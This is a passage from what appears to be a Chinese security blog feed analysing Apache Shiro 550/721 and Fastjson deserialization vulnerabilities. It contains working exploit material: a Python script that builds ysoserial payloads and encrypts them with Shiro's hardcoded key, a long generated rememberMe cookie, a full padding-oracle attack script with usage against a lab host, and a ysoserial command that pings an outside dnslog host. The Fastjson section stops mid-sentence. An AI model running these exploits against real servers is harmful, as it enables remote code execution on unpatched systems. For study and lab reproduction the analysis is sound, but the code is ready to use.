subprocess.Popen([&#39;D:\\Java\\jdk1.8.0_111\\bin\\java.exe&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;CommonsCollections11&#39;, command], stdout=subprocess.PIPE)    BS   = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key  =  &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;    mode =  AES.MODE_CBC    iv   =  uuid.uuid4().bytes    encryptor = AES.new(base64.b64decode(key), mode, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertextif __name__ == &#39;__main__&#39;:    payload = encode_rememberme(sys.argv[1])    print(&quot;rememberMe=&#123;&#125;&quot;.format(payload.decode()))</code></pre><p>运行</p><pre><code>python exp.py &quot;calc&quot;</code></pre><p>运行结果</p><pre><code>rememberMe=XGUr6gD4ROGr3hXfCCR+552ZDOGUz7RNy3NVrFL60gCD+M6CJY8sKWQr2FjC6JBR9cV9vCg0aE5srsMIp1X45r9NZf6AL/t1m+ldqR3AvgmHBYRS3jb6NqFGhLdU/kkYx7yrrdUlJ6Fsu1qlePITCG3+hIa4qMPw3vDxPmlUpgtiLaXU5ETc/9rXez7Uy0AbPa3qypDp2INyd5ilrGs5IaYf6AnsvIrDuL4xWwh54d48yerJ1OTXTRAF+NI9HXOrF5Ab17tCLuL3dlftB84Mf2SdH4mXZnp/ERZd3IfQ1H4OlWIWnf3r0MVjb3x091c8K03pmZILcIRwqVW0PeSYspnaKq+exsXI8YjH2i3LOpphYzUc9kLeLHleUsDvkiKicn4tR7HIFrPq7Ddqn7BFgnWE6OThLj90kGT19ZbzNz2b/a79n0WzFgNl35LgStJhxVq3pRltV91cQOhBA79ByJ+jdsnxmKnNwKDosCpUnwDpW02nzug6dHAuTpEGhJfrnZopx0uyJr51MNvvMlin9Bpm5zwfyfIZjiPZT/AHoum925fk+gQ4/UNGqb4gUkxj+8ak/BkEAJn3+xMurrFTb9lG2Y/7Sj6QlW6r+3DxuLucq5f0ncxpHH2k/HVj6M9fPbOT+38UPWm3tIGjZE1Up8tCuKVO8usqddt4kXLx4EvH+AOyZYlt1b6z431i2V2p+eoxtM1QmaGJ4liYNkliH8ViYwG8We1REgZ/s1oRghI+w/fb4eK87NhRhVG7Y0wVkPTkoN6GyLIlqNImd5SXJunG0HkcVuQDy0O2RO7SXRnJQq9lVVv4aY9uwIZJ8hpFLHphLbqBYIjmObfx9ddahRl5kcokN5RJbNXpmYOkYHsWSYLZNtOmyEkaQK+k3W6l71iD3gWoa5RXY8oRk6CJsda0VGAsJkaOdAmqOn7saQyx8b+LDCb96ZUS4BYitW6W6X1NSVyQ1utEIOttWjkTPaIzqR1+7VMepJCaPdUltLFRIPiBrfnJgNmHSww+pRB9yv7cqiMgrMAdTBRc4V5oq4wKCRQfiq99yh3zjXz2nOaomgV/ZUOhqHenJVb6U9wlonA+L0qb0Ge3kluoa7chNuMi3Mb41ZG2Tujskf7mdInayQdfzM/XeP3vcJZgX+n2jPkYJ2aNB93JooA3wDwtTqLzNVShB1lSFJqLw1x70zNkeVpRSrjRdwKi6fK3mcORAu8fnB6QBQtgLSmB3zxw8sT4Co2m0piGGt06HHJm/c4cgFT+yR7pf6fHEm3W3wz6/kQpZNwRTa6GD5H77rUCliHfm8P0bwmA07W/RkxD9/pMHjICd6gb5oPopDZktfxOa2acYH/bUNAva+lu09vV7VT+UhxSzHCEeqnco+HuFKygH58yG51mF+C5NteaEbNA61CPjjk6SmxFJz2wgCrYiOrl0ID+gYMn27YKxR8RYeWZAHtlYEVITm86O9dm5M0rfzJSD5M4FSeRr+KaVOWUcQM+C+rSiuDrxDRRIixgEG3fd25kk6jkHSBEwZQHZgVH5h/UR2QFWfrzg/pCQMHMwdiAEN3pQ2sXNnWkadvLFqg18q+HnXyjY8MPEtuG2mSIfjJBuN6n+clxrY/A2u7hWKncVbu+LYq3PKg7o/3Oe9i36erIZAVSgyekqb/Fn8E0TFveVPca2iyl/LGPWTycZH1bf8wYFtvlf09Nl6mR2Zpi102v8owawG75PHB/3odICxFX43IN3nnU+QsDt7tdk9BxMws3BE9EpZyG0hvWTH6w0mpLXRGulH4Lz8t49egtL1IvGAYXYwPZPy2aN5/vFm7hdTsstCou3UbhMRVrLgSMV/zhpZroiKQfUmTK756m8+aI/Kne+uFIMcypiZk1nCx4cdFF7p7PpH1+98ZGLIl5w1PMpnBWZ1eoQm/rlRzX9xHQtxZD1SHVipsfGOp7jDgYrRLgkIA41xmHcOXAoVPburAXraRNkNxe6bmMmhORolFuGUiyhX+pwxAbv+2Jaz0s4SDWPng59ADJd0aMIrP4SFqhPhpATl5M1DTBzlRQTrClQ1QNK2pOuIzsLzcIsR+qz+8RpDjK2kPIGAFvsUGWTB+DLCt9DLOa0GRgFVC9XGy5371JRrTCHhWAaQPhcN8UCyhSdAKrwxDSHXhaenk+QPKsnHQvC+QfG5k3mEGkl+Oeb9yoLrYHZa9apPc1A0Hf01YFdGHuTQDB8DsdaKpp6kbPpI1vm/SH9AohYRO9vmQ0MKuViNbuUvdlI0IJSR9u/G+wV9ODx4B9NqSmvE1eIntZt6NdjijR3jf+Jg1ZOsRZeVuyAeNso7alFaDUwe3FhmbU56mM0d3jQ1i2nQSdrOJ8dHAchiD3UQKgIyxpaazVqrbFmfQ/+ndpDQej5gB9j5TcV9i07W7Da7Id1ZDkzTJyS+s1tLmJesKU+mdE9PHbuTqLm9j0j07sLmTU/xGmP2fGlEAZYTZiC46R9l+L9LPDg8wLBhvpt51/golQ5QNbJu1iNxeG2Dt2kVImEL1hiKb6OlfQ9QqqhZlT4NQQHdBkvZSxGEBUWx5+RalHxMT++BAEAu8GBbnSVxH+21fR+q5HPn0YzDlMNjhvog0foC3LLlgkhTLEfSkZ3/7+ZkRE+Yygl/xJs/qhPZ+AtYwdUr2u+DP6IiqsFmNIU2FXYVWjeuaP+I7e5GfcF7RqzVisf5cYtbgrJQjCpispNP0SV9rKhpD3d63rNcrecwXoXG7STUiZ9Ddiq/H91rs+ZIGW/ewkP83MNDz/h/SdDVkccIWY0u8olhaExMFuM+twY5Gyr41r5AXfkZ3ofwGGi0y8QYNzTpm42dTLMfiyq7Mit+HtIsRPOB15xGw2p+zwPno2LK8H66mzDci+81uUWUYR5e1jD7UsPfw/0eO+eHrE6CFHP9RCMJ5zWdKNSqLJ+PYAAK3R2iGd+2s735JcyqiBGOp9JEytC1NhY4+ggQKp1k0SlBlbkzM970RUU+raMcV9F34415zjtihspktOcAlRSuxRTji8aD4iK7C9VFmBIaN85flM8ZDRx3dT0BHdDVPqTdWce8oP2pNAC43IG0uXvhobBGL2OcrbjY+sjqYP8181S8t6ysqADIMi4RsEr6sdbMfdYIRaLoh7mzRfxSeJgACHc8jlu/ioANqbifaixZFxYwG7tLCSqgAObAc6QKz0abiWalknxbiSOkFbAg8RzidRojhxwK7TDKbB4eTdKKw45DSbL9p2LInq4+CwiP3kmj0IhruQcdyfUE29QdLtr3hdSOAKplWjdymTFaCOEYl+ipuHPjV0Ha3WZPPR361Ik8yelUJzzsrhQJ2hKrGyskJLG2uFotEtPstSfy5mRGkQ2IteXvec8JcJ0nxrQvAuq4BLBL/RrtCo1dVLia7cSu/XaquEYHxJZc53VnhHojCpBe8YugB/2QsqXDTZ2mJCvQTsY31KJhy+fwjs9Z3zZWq+/NAvKcNvVpwh+OqiNMvRdUJiFKPa2fEls1jnUtobyZ5Zex5N3lthC2BZyBvs6/9Ma7cnROwBHcAui9lbSkK7DY/Tm8/nHUNmvE+o/rbsmvRIHExJ1NzrNdDXFvsg4+FScpVhU3Py0ecg2WRFxnC2U5UjKwRzEmMyKDqY91Xo7wpE8s12Hse+K6nsXHgLI7+33hCoIC6Rg9ffkViXx6gqFrViQxyOgC2C4d1dflU01uzcf3zBEMMEWz67B6pQFtxvqU8mAgzW+WTzX7X5L9edHKDarzHxarSshWswd37ruPDF8VbTTeNoyx+HUAriQxXQ5jkfuWRsqixwnH9mDOhmTcbebY0zVc4kSpF9xmUDa2hNX8do8oiBZ0gT6Wlo17wSvuQDLLhXmlj4eLNI+nqP9aLP2mXPbiNhtw0LyNBdDISRYidbSMARETawOslOYolNDI5Xs41SJhEBLRz7ZooAWDWZrbgDmXqoJz/kiwnrJ+9YiWenrHyPq7pUQspW76Qsq82NZfkv5NxND2fVysTYdB+JV/cnwGznuf+VoaFdACr3FUZWSR1LOZKlGaUensXv5lOmlmvlzWmlvRuFeKCOHdx/LR8epWHuuEo4p2BTrMYGK8+M6C9YlhxXeelBRIvNd8zatIcczEO/Db6t5wPSqyIE+C1Mv8aLWB0=</code></pre><p>将它添加到Cookie上，注意，要删除原来的<code>JSESSIONID=xxxx</code> ,如果存在，系统将不解析rememberMe进行身份认证，导致无法利用</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304161707940.png" alt="image-20230411223955129"></p><p>运行结果</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304161706555.png" alt="image-20230411224237689"></p><h1 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>在Shiro721漏洞中，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle Attack来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304161706845.png" alt="img"></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>知道已经登陆用户的合法cookie且目标服务器含有可利用的攻击链就可以进行漏洞利用。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code>1.2.5,  1.2.6,  1.3.0,  1.3.1,  1.3.2,  1.4.0-RC2,  1.4.0,  1.4.1</code></pre><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>在Shiro550中,加密Cookie的密钥是硬编码的</p><pre><code class="java">public AbstractRememberMeManager() &#123;        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();        this.cipherService = new AesCipherService();        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);    &#125;</code></pre><p>在1.2.5的版本后密钥变成了动态的,通过<code>generateNewKey()</code>获取密钥</p><pre><code class="java">public AbstractRememberMeManager() &#123;        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();        AesCipherService cipherService = new AesCipherService();        this.cipherService = cipherService;        setCipherKey(cipherService.generateNewKey().getEncoded());    &#125;</code></pre><p>跟进查看<code>generateNewKey</code></p><pre><code class="java">public Key generateNewKey(int keyBitSize) &#123;    KeyGenerator kg;    try &#123;        kg = KeyGenerator.getInstance(getAlgorithmName());    &#125; catch (NoSuchAlgorithmException e) &#123;        String msg = &quot;Unable to acquire &quot; + getAlgorithmName() + &quot; algorithm.  This is required to function.&quot;;        throw new IllegalStateException(msg, e);    &#125;    kg.init(keyBitSize);    return kg.generateKey();&#125;</code></pre><p>这里使用了<code>init()</code>对keyBitSize进行初始化,跟进查看</p><pre><code class="java">public final void init(int keysize) &#123;    this.init(keysize, JCAUtil.getDefSecureRandom());&#125;</code></pre><p>这里调用了双参数<code>init()</code>，并且获取了一个随机数发生器<code>SecureRandom</code></p><p>下一步调用了<code>kg.generateKey()</code></p><pre><code class="java">public final SecretKey generateKey() &#123;    if (this.serviceIterator == null) &#123;        return this.spi.engineGenerateKey();    &#125; else &#123;        RuntimeException failure = null;        KeyGeneratorSpi mySpi = this.spi;        while(true) &#123;            try &#123;                return mySpi.engineGenerateKey();            &#125; catch (RuntimeException var4) &#123;                if (failure == null) &#123;                    failure = var4;                &#125;                mySpi = this.nextSpi(mySpi, true);                if (mySpi == null) &#123;                    throw failure;                &#125;            &#125;        &#125;    &#125;&#125;</code></pre><p>于生成加密所需的密钥，该方法首先会检查是否存在可用的 Service Provider Interface (SPI) 实例，如果存在则调用该实例的 engineGenerateKey() 方法来生成密钥</p><p>跟到<code>engineGenerateKey()</code></p><pre><code class="java">protected SecretKey engineGenerateKey()&#123;    SecretKeySpec var1 = null;    if(this.random == null)&#123;        this.random = SunJCE.getRandom();    &#125;    byte[] var2 = new byte[this.keySize];    this.random.nextBytes(var2);    var1 = new SecretKeySpec(var2,&quot;AES&quot;);    return var1;&#125;</code></pre><p>这里使用了AES算法生成对称密钥</p><p>以上是生成密钥的过程</p><h2 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h2><p><strong>PS:懵了</strong></p><p>参考<a href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a></p><p>Padding Oracle Attack加密数据整体过程：</p><ol><li>选择一个明文<code>P</code>，用来生成你想要的密文<code>C</code>；</li><li>使用适当的Padding将字符串填充为块大小的倍数，然后将其拆分为从1到N的块；</li><li>生成一个随机数据块（C[n]表示最后一个密文块）；</li><li>对于每一个明文块，从最后一块开始：<ol><li>创建一个包括两块的密文C’，其是通过一个空块（00000…）与最近生成的密文块C[n+1]（如果是第一轮则是随机块）组合成的；</li><li>这步容易理解，就是Padding Oracle的基本攻击原理：修改空块的最后一个字节直至Padding Oracle没有出现错误为止，然后继续将最后一个字节设置为2并修改最后第二个字节直至Padding Oracle没有出现错误为止，依次类推，继续计算出倒数第3、4…个直至最后一个数据为止；</li><li>在计算完整个块之后，将它与明文块P[n]进行XOR一起创建C[n]；</li><li>对后续的每个块重复上述过程（在新的密文块前添加一个空块，然后进行Padding Oracle爆破计算）；</li></ol></li></ol><p>简单地说，每一个密文块解密为一个未知值，然后与前一个密文块进行XOR。通过仔细选择前一个块，我们可以控制下一个块解密来得到什么。即使下一个块解密为一堆无用数据，但仍然能被XOR化为我们控制的值，因此可以设置为任何我们想要的值</p><p>Padding Oracle Attack攻击是一种类似于sql盲注的攻击,这就要求服务器端有能够被我们利用的布尔条件</p><p>在<a href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a> 这篇文章中，模拟的环境如下：</p><ul><li>当收到一个有效的密文（一个被正确填充并包含有效数据的密文）时，应用程序正常响应（200 OK）</li><li>当收到无效的密文时（解密时填充错误的密文），应用程序会抛出加密异常（500 内部服务器错误）</li><li>当收到一个有效密文（解密时正确填充的密文）但解密为无效值时，应用程序会显示自定义错误消息 (200 OK)</li></ul><p>说明可以通过响应头来判断明文填充是否正确，进而爆破出中间值</p><h2 id="布尔条件"><a href="#布尔条件" class="headerlink" title="布尔条件"></a>布尔条件</h2><p>回到Shiro中，解密函数<code>AbstractRememberMeManager.decrypt()</code>:</p><pre><code class="java">protected byte[] decrypt(byte[] encrypted) &#123;    byte[] serialized = encrypted;    CipherService cipherService = getCipherService();    if (cipherService != null) &#123;        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());        serialized = byteSource.getBytes();    &#125;    return serialized;&#125;</code></pre><p>跟进<code>cipherService.decrypt()</code>，最后到<code>crypt()</code>中调用<code>doFinal()</code>方法</p><pre><code class="java">private byte[] crypt(javax.crypto.Cipher cipher, byte[] bytes) throws CryptoException &#123;    try &#123;        return cipher.doFinal(bytes);    &#125; catch (Exception e) &#123;        String msg = &quot;Unable to execute &#39;doFinal&#39; with cipher instance [&quot; + cipher + &quot;].&quot;;        throw new CryptoException(msg, e);    &#125;&#125;</code></pre><p>这里的<code>doFinal()</code>方法对密文进行异常处理</p><pre><code class="java">public final byte[] doFinal(byte[] input) throws IllegalBlockSizeException, BadPaddingException &#123;    this.checkCipherState();    if (input == null) &#123;        throw new IllegalArgumentException(&quot;Null input buffer&quot;);    &#125; else &#123;        this.chooseFirstProvider();        return this.spi.engineDoFinal(input, 0, input.length);    &#125;&#125;</code></pre><p><code>doFinal()</code>方法有<code>IllegalBlockSizeException</code>和<code>BadPaddingException</code>这两个异常，分别用于捕获块大小异常和填充错误异常。异常会被抛出到<code>crypt()</code>方法中，最终被<code>getRememberedPrincipals()</code>方法捕获，并执行<code>onRememberedPrincipalFailure()</code>方法。</p><pre><code class="java">public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) &#123;    PrincipalCollection principals = null;    try &#123;        byte[] bytes = getRememberedSerializedIdentity(subjectContext);        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:        if (bytes != null &amp;&amp; bytes.length &gt; 0) &#123;            principals = convertBytesToPrincipals(bytes, subjectContext);        &#125;    &#125; catch (RuntimeException re) &#123;        principals = onRememberedPrincipalFailure(re, subjectContext);    &#125;    return principals;&#125;</code></pre><p>这里的onRememberedPrincipalFailure()<code>方法调用了</code>forgetIdentity()该方法会调用<code>removeFrom()</code>，在response头部添加字段<code>Set-Cookie: rememberMe=deleteMe</code>。</p><pre><code class="java">protected PrincipalCollection onRememberedPrincipalFailure(RuntimeException e, SubjectContext context) &#123;    if (log.isWarnEnabled()) &#123;        String message = &quot;There was a failure while trying to retrieve remembered principals.  This could be due to a &quot; +                &quot;configuration problem or corrupted principals.  This could also be due to a recently &quot; +                &quot;changed encryption key, if you are using a shiro.ini file, this property would be &quot; +                &quot;&#39;securityManager.rememberMeManager.cipherKey&#39; see: http://shiro.apache.org/web.html#Web-RememberMeServices. &quot; +                &quot;The remembered identity will be forgotten and not used for this request.&quot;;        log.warn(message);    &#125;    forgetIdentity(context);    //propagate - security manager implementation will handle and warn appropriately    throw e;&#125;</code></pre><p>倘若Padding结果不正确的话，响应包就会返回 <code>Set-Cookie: rememberMe=deleteMe</code></p><p>如果Padding结果正确呢？</p><p>CBC模式下的分组密码，如果某一组的密文被破坏，那么在其之后的分组都会受到影响。这时候我们的密文就无法正确的被反序列化了</p><p>在反序列化的过程中，如果反序列化的结果错误，则会抛出异常。最后异常仍会被<code>getRememberedPrincipals()</code>方法处理。</p><p>但是对于Java来说，反序列化是以Stream的方式按顺序进行的，向其后添加或更改一些字符串并不会影响正常反序列化。</p><pre><code class="java">public T deserialize(byte[] serialized) throws SerializationException &#123;    if (serialized == null) &#123;        String msg = &quot;argument cannot be null.&quot;;        throw new IllegalArgumentException(msg);    &#125;    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);    BufferedInputStream bis = new BufferedInputStream(bais);    try &#123;        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);        @SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)        T deserialized = (T) ois.readObject();        ois.close();        return deserialized;    &#125; catch (Exception e) &#123;        String msg = &quot;Unable to deserialize argument byte array.&quot;;        throw new SerializationException(msg, e);    &#125;&#125;</code></pre><p>综上所述</p><ul><li>Padding正确，服务器正常响应</li><li>Padding错误，服务器返回<code>Set-Cookie: rememberMe=deleteMe</code></li></ul><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>这里使用的是Vulfocus的环境</p><p>首先先登陆</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230416170055907.png" alt="image-20230416170055907"></p><p>获取COOkie</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304161706960.png" alt="image-20230416170218529"></p><p>先用<code>ysoserial</code>生成class</p><pre><code class="bash">java -jar ysoserial.jar CommonsCollections1 &quot;ping 4997u3.dnslog.cn&quot; &gt; payload.class</code></pre><p>python exp：</p><pre><code class="python">#https://github.com/3ndz/Shiro-721# -*- coding: utf-8 -*-from paddingoracle import BadPaddingException, PaddingOraclefrom base64 import b64encode, b64decodefrom urllib import quote, unquoteimport requestsimport socketimport timeclass PadBuster(PaddingOracle):    def __init__(self, **kwargs):        super(PadBuster, self).__init__(**kwargs)        self.session = requests.Session()        self.wait = kwargs.get(&#39;wait&#39;, 2.0)    def oracle(self, data, **kwargs):        somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)        self.session.cookies[&#39;rememberMe&#39;] = somecookie        if self.session.cookies.get(&#39;JSESSIONID&#39;):            del self.session.cookies[&#39;JSESSIONID&#39;]        while 1:            try:                response = self.session.get(sys.argv[1],                        stream=False, timeout=5, verify=False)                break            except (socket.error, requests.exceptions.RequestException):                logging.exception(&#39;Retrying request in %.2f seconds...&#39;,                                  self.wait)                time.sleep(self.wait)                continue        self.history.append(response)        if response.headers.get(&#39;Set-Cookie&#39;) is None or &#39;deleteMe&#39; not in response.headers.get(&#39;Set-Cookie&#39;):            logging.debug(&#39;No padding exception raised on %r&#39;, somecookie)            return        raise BadPaddingExceptionif __name__ == &#39;__main__&#39;:    import logging    import sys    if not sys.argv[3:]:        print &#39;Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;&#39; % (sys.argv[0], )        sys.exit(1)    logging.basicConfig(level=logging.DEBUG)    encrypted_cookie = b64decode(unquote(sys.argv[2]))    padbuster = PadBuster()    payload = open(sys.argv[3], &#39;rb&#39;).read()    enc = padbuster.encrypt(plaintext=payload, block_size=16)    print(&#39;rememberMe cookies:&#39;)    print(b64encode(enc))</code></pre><p>使用方法:</p><pre><code class="bash">python shiro_exp.py http://192.168.110.131:41906/account [rememberMeCookie] payload.class</code></pre><p>也可以使用工具：</p><p><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p><p>PS：跑很久</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304161706812.png" alt="image-20230416170521336"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson漏洞分析</title>
      <link href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="Fastjson漏洞分析"><a href="#Fastjson漏洞分析" class="headerlink" title="Fastjson漏洞分析"></a>Fastjson漏洞分析</h1><p><code>FastJson</code> 是阿⾥巴巴的开源 <code>JSON 解析库</code>，它可以解析 JSON 格式的字符串，⽀持将<code> Java Bean</code> 序列</p><p>化为 <code>JSON</code> 字符串，也可以从JSON字符串反序列化到 Java Bean</p><p>环境：</p><p>jdk1.8.0_u111</p><p>fastjson: 1.2.24</p><pre><code class="xml">&lt;dependency&gt;  &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  &lt;version&gt;1.2.24&lt;/version&gt;&lt;/dependency&gt;</code></pre><h2 id="Fastjson的简单使用"><a href="#Fastjson的简单使用" class="headerlink" title="Fastjson的简单使用"></a>Fastjson的简单使用</h2><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import jdk.nashorn.api.scripting.JSObject;public class demo1 &#123;    public static void main(String[] args) &#123;        String s = &quot;&#123;\&quot;age\&quot;:\&quot;18\&quot;,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;;        JSONObject jsonObject = JSON.parseObject(s);//将字符串解析为json格式        System.out.println(jsonObject);    &#125;&#125;</code></pre><p>输出结果：</p><pre><code class="tex">&#123;&quot;name&quot;:&quot;abc&quot;,&quot;age&quot;:&quot;18&quot;&#125;</code></pre><h2 id="Java-Bean"><a href="#Java-Bean" class="headerlink" title="Java Bean"></a>Java Bean</h2><p>Java Bean 是一种符合特定规范的 Java 类，它是指那些用于传递数据的简单对象。Java Bean 类通常具有以下特点：</p><ol><li>必须有一个默认的构造函数；</li><li>属性必须私有化<code>public</code>，通过公有的<code>public</code>   getter&#x2F;setter 方法进行访问；</li></ol><pre><code class="java">public class Person &#123;    private String name;    private int age;    public String getName() &#123; return this.name; &#125;    public void setName(String name) &#123; this.name = name; &#125;    public int getAge() &#123; return this.age; &#125;    public void setAge(int age) &#123; this.age = age; &#125;&#125;</code></pre><p>Java Bean 主要用于封装数据，方便在不同层间传递。它们通常被广泛用于图形用户界面 (GUI) 编程、企业级应用程序和数据库操作等方面，可以使代码更加清晰易懂，并且提高代码的可复用性和扩展性。</p><h2 id="Fastjson-Java-Bean"><a href="#Fastjson-Java-Bean" class="headerlink" title="Fastjson+Java Bean"></a>Fastjson+Java Bean</h2><p>先写一个<code>Java Bean</code>  Person类</p><pre><code class="java">package org.example;public class Person &#123;    private String name;    private int age;    public void Person() &#123;        System.out.println(&quot;调用空参构造Person()&quot;);    &#125;    public void Person(String name, int age) &#123;        System.out.println(&quot;调用形参构造Person(String name, int age)&quot;);        this.name = name;        this.age = age;    &#125;    public String getName() &#123;        System.out.println(&quot;调用getName()&quot;);        return name;    &#125;    public void setName(String name) &#123;        System.out.println(&quot;调用setName()&quot;);        this.name = name;    &#125;    public int getAge() &#123;        System.out.println(&quot;调用getAge()&quot;);        return age;    &#125;    public void setAge(int age) &#123;        System.out.println(&quot;调用setAge()&quot;);        this.age = age;    &#125;    @Override    public String toString() &#123;        System.out.println(&quot;调用toString()&quot;);        return &quot;User&#123;&quot; +                &quot;name=&#39;&quot; + name + &#39;\&#39;&#39; +                &quot;, age=&quot; + age +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>写个demo</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import jdk.nashorn.api.scripting.JSObject;public class demo1 &#123;    public static void main(String[] args) &#123;        String s = &quot;&#123;\&quot;age\&quot;:\&quot;18\&quot;,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;;        Person p =  JSON.parseObject(s,Person.class);//解析的时候指定解析的类,指定了对象类型        System.out.println(p);        System.out.println(p.getName());        System.out.println(p.getAge());        System.out.println(p.toString());    &#125;&#125;</code></pre><p>输出结果</p><pre><code class="tex">调用setAge()调用setName()调用toString()User&#123;name=&#39;abc&#39;, age=18&#125;调用getName()abc调用getAge()18调用toString()User&#123;name=&#39;abc&#39;, age=18&#125;</code></pre><p>这里可以看到，把json字符串解析为java对象，并且能够正常调用对象的方法</p><p>通过输出结果和调试了解到，json中对应的值是通过setter方法传给对象的 ，并且通过getter获取值</p><h2 id="奇怪的特性"><a href="#奇怪的特性" class="headerlink" title="奇怪的特性"></a>奇怪的特性</h2><p>上面的都是比较正常的用法,但是Fastjson有个奇怪的特性，就是它会根据传入的字符串不同，导致解析不同的类</p><p>例如：</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import jdk.nashorn.api.scripting.JSObject;public class demo1 &#123;    public static void main(String[] args) &#123;        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:\&quot;18\&quot;,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;;        JSONObject jsonObject = JSON.parseObject(s);        System.out.println(jsonObject);        System.out.println(jsonObject.get(&quot;age&quot;));    &#125;&#125;</code></pre><p>输出结果</p><pre><code>调用setAge()调用setName()调用getAge()调用getName()&#123;&quot;name&quot;:&quot;abc&quot;,&quot;age&quot;:18&#125;18</code></pre><p>如果给解析传的字符串中含有<code>@type</code>字段，就相当于指定一个类(如例子中的<code>org.example.Person</code>)，按照这个类去解析</p><p>调试分析：</p><p>调试到DefaultJSONParser.java，这里有一个判断，当json中key为“@type”并且满足<code>!lexer.isEnabled(Feature.DisableSpecialKeyDetect)</code></p><p>就会进入判断</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304092009321.png" alt="image-20230408222122119"></p><p>进入判断后，调用<code>TypeUtils.loadClass()</code>,将@type对应的value作为类对象加载</p><h2 id="反序列化利用链"><a href="#反序列化利用链" class="headerlink" title="反序列化利用链"></a>反序列化利用链</h2><p>fastjson的反序列化和原生反序列化不同的点：</p><ul><li>不需要实现Serializable</li><li>变量不需要非transient ,变量有对应的setter或者是public 或者是满足条件的getter</li><li>原生的反序列化的入口点是readObject,但fastjson是setter&#x2F;getter</li></ul><p>总的来说，和原生的反序列化漏洞不是一个东西，协议不同，fastjson在解析json数据的过程中进行的序列化操作，并且和原生的序列化操作不一样</p><p>这个序列化的漏洞点在<code>JdbcRowSetImpl</code>类中，</p><p>里面的connect方法如下</p><pre><code class="java">private Connection connect() throws SQLException &#123;    if (this.conn != null) &#123;        return this.conn;    &#125; else if (this.getDataSourceName() != null) &#123;        try &#123;            InitialContext var1 = new InitialContext();            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());            return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();        &#125; catch (NamingException var3) &#123;            throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());        &#125;    &#125; else &#123;        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;    &#125;&#125;</code></pre><p>在第6,7行中可以看到它调用了 <code>InitialContext()</code>和 <code>lookup()</code> ，如果<code>this.getDataSourceName()</code>可控，这不妥妥的JNDI注入吗</p><p>查看一下<code>getDataSourceName()</code>，发现是直接返回<code>dataSource</code></p><pre><code class="java">public String getDataSourceName() &#123;    return dataSource;&#125;</code></pre><p><code>dataSource</code>,跟进查看得知，它是BaseRowSet类的一个私有属性，并且存在getter和setter方法</p><pre><code class="java">public String getDataSourceName() &#123;    return dataSource;&#125;</code></pre><pre><code class="java">public void setDataSourceName(String name) throws SQLException &#123;    if (name == null) &#123;        dataSource = null;    &#125; else if (name.equals(&quot;&quot;)) &#123;       throw new SQLException(&quot;DataSource name cannot be empty string&quot;);    &#125; else &#123;       dataSource = name;    &#125;    URL = null;&#125;</code></pre><p>这就很符合Java 